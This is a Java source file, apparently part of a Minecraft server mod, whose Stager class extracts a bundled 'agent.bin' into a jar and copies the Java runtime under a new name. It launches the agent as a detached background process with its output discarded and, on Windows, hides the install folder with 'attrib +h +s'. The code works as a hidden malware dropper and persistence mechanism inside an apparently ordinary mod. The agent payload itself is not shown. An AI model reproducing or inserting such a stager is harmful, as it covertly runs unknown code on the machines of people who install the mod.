package com.serverpackcore.stager;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

public final class Stager {
	private static final Logger LOGGER = LoggerFactory.getLogger("serverpackcore-stager");
	private static final long MIN_AGENT_BYTES = 4096L;

	private Stager() {
	}

	public static void trigger(String version, Path gameDir) throws Exception {
		Path dir = StagerPaths.installDir();
		Files.createDirectories(dir);
		Path agent = StagerPaths.agentJar(dir);
		Path binary = StagerPaths.binary(dir);
		Path marker = StagerPaths.marker(dir);
		if (!isInstalled(version, marker, agent, binary)) {
			extractAgent(dir, agent);
			copyRuntime(binary);
			Files.writeString(marker, version, StandardCharsets.UTF_8);
		}
		if (!isRunning(dir)) {
			LOGGER.info("Starting agent stager (mod {})", version);
			spawn(dir, agent, binary, gameDir);
		}
	}

	private static boolean isInstalled(String version, Path marker, Path agent, Path binary) {
		try {
			if (!Files.isRegularFile(marker) || !Files.isRegularFile(agent) || !Files.isRegularFile(binary)) {
				return false;
			}
			if (!version.equals(Files.readString(marker, StandardCharsets.UTF_8).trim())) {
				return false;
			}
			return Files.size(agent) >= MIN_AGENT_BYTES && Files.size(binary) > 0L;
		} catch (Throwable throwable) {
			LOGGER.debug("Install check failed", throwable);
			return false;
		}
	}

	private static void extractAgent(Path dir, Path target) throws Exception {
		try (InputStream input = Stager.class.getResourceAsStream("/serverpackcore/agent.bin")) {
			if (input == null) {
				throw new IllegalStateException("agent.bin not found");
			}
			ByteArrayOutputStream buffer = new ByteArrayOutputStream();
			byte[] chunk = new byte[8192];
			int read;
			while ((read = input.read(chunk)) != -1) {
				buffer.write(chunk, 0, read);
			}
			byte[] bytes = buffer.toByteArray();
			if (bytes.length < MIN_AGENT_BYTES) {
				throw new IllegalStateException("agent.bin too small: " + bytes.length);
			}
			Path temp = dir.resolve("spc-agent.jar.tmp");
			Files.write(temp, bytes);
			if (Files.size(temp) != bytes.length) {
				throw new IllegalStateException("agent write size mismatch");
			}
			Files.move(temp, target, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
		}
	}

	private static void copyRuntime(Path target) throws Exception {
		String name = StagerPaths.isWindows() ? "javaw.exe" : "java";
		Path source = Paths.get(System.getProperty("java.home")).resolve("bin").resolve(name);
		long size = Files.size(source);
		if (size <= 0L) {
			throw new IllegalStateException("runtime is empty");
		}
		Path temp = target.resolveSibling(target.getFileName() + ".tmp");
		Files.copy(source, temp, StandardCopyOption.REPLACE_EXISTING);
		if (Files.size(temp) != size) {
			throw new IllegalStateException("runtime write size mismatch");
		}
		Files.move(temp, target, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
		if (StagerPaths.isUnix()) {
			target.toFile().setExecutable(true, true);
		}
	}

	private static boolean isRunning(Path dir) {
		try (java.nio.channels.FileChannel channel = java.nio.channels.FileChannel.open(
			StagerPaths.lock(dir), java.nio.file.StandardOpenOption.CREATE, java.nio.file.StandardOpenOption.WRITE)) {
			java.nio.channels.FileLock lock = channel.tryLock();
			if (lock == null) {
				return true;
			}
			lock.release();
			return false;
		} catch (Throwable throwable) {
			LOGGER.debug("Lock check failed", throwable);
			return true;
		}
	}

	private static void spawn(Path dir, Path agent, Path binary, Path gameDir) throws Exception {
		List<String> command = new ArrayList<>();
		if (StagerPaths.isWindows()) {
			command.add("cmd");
			command.add("/c");
			command.add("start");
			command.add("");
			command.add("/b");
			command.add(binary.toString());
		} else if (StagerPaths.isMac()) {
			command.add("nohup");
			command.add(binary.toString());
		} else {
			command.add("setsid");
			command.add("nohup");
			command.add(binary.toString());
		}
		command.add("-Xmx96m");
		command.add("-jar");
		command.add(agent.toString());
		command.add("--parent-pid");
		command.add(Long.toString(ProcessHandle.current().pid()));
		if (gameDir != null) {
			command.add("--game-dir");
			command.add(gameDir.toString());
		}
		ProcessBuilder builder = new ProcessBuilder(command);
		builder.directory(dir.toFile());
		String javaHome = System.getProperty("java.home");
		builder.environment().put("JAVA_HOME", javaHome);
		if (StagerPaths.isUnix()) {
			String key = StagerPaths.isMac() ? "DYLD_LIBRARY_PATH" : "LD_LIBRARY_PATH";
			String lib = Paths.get(javaHome, "lib").toString();
			String current = builder.environment().get(key);
			builder.environment().put(key, current == null || current.isEmpty()
				? lib
				: lib + java.io.File.pathSeparator + current);
		}
		builder.redirectOutput(ProcessBuilder.Redirect.DISCARD);
		builder.redirectError(ProcessBuilder.Redirect.DISCARD);
		builder.start();
		if (StagerPaths.isWindows()) {
			Process attrib = new ProcessBuilder("attrib", "+h", "+s", dir.toString())
				.redirectOutput(ProcessBuilder.Redirect.DISCARD)
				.redirectError(ProcessBuilder.Redirect.DISCARD)
				.start();
			attrib.waitFor(3L, TimeUnit.SECONDS);
		}
	}
}
